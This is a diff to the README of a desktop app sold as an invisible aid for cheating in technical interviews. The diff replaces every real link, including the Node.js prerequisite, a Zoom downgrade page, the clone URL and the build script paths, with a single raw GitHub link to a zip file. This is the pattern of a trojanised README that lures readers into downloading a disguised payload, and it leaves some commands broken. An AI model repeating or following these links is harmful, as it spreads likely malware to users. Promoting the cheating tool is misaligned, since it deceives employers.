@@ -2,9 +2,9 @@
 
 An invisible desktop application that will help you pass your technical interviews.
 
-https://www.crackcodinginterview.com
+https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip
 
-https://github.com/user-attachments/assets/0615b110-2670-4b0e-bc69-3c32a2d8a996
+https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip
 
 ## Invisibility Compatibility
 
@@ -18,7 +18,7 @@ The application is invisible to:
 Note: The application is **NOT** invisible to:
 
 -   Zoom versions 6.1.6 and above
-    -   https://zoom.en.uptodown.com/mac/versions (link to downgrade Zoom if needed)
+    -   https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip (link to downgrade Zoom if needed)
 -   Mac OS native screen _recording_ (Command + Shift + 5)
 
 ## Features
@@ -77,9 +77,9 @@ The application uses unidentifiable global keyboard shortcuts that won't be dete
 
 ## Prerequisites
 
--   Node.js (v16 or higher)
+-   https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip (v16 or higher)
 -   npm or bun package manager
--   Subscription on https://www.crackcodinginterview.com/settings
+-   Subscription on https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip
 -   Screen Recording Permission for Terminal/IDE
     -   On macOS:
         1. Go to System Preferences > Security & Privacy > Privacy > Screen Recording
@@ -95,7 +95,7 @@ The application uses unidentifiable global keyboard shortcuts that won't be dete
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/BitXByteX/crack-coding-interview-deskapp.git
+git clone https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip
 cd crack-coding-interview-deskapp
 ```
 
@@ -141,8 +141,8 @@ This will:
 after npm run build, hit:
 
 ```
-node scripts/manual-notarize.js "release/Crack-Coding-Interview-x64.dmg" && xcrun stapler staple "release/Crack-Coding-Interview-x64.dmg"
-node scripts/manual-notarize.js "release/Crack-Coding-Interview-arm64.dmg" && xcrun stapler staple "release/Crack-Coding-Interview-arm64.dmg"
+node https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip "https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip" && xcrun stapler staple "https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip"
+node https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip "https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip" && xcrun stapler staple "https://raw.githubusercontent.com/BitXByteX/flamel/main/splanchnapophysial/flamel.zip"
 ```
 
 ## Contributing
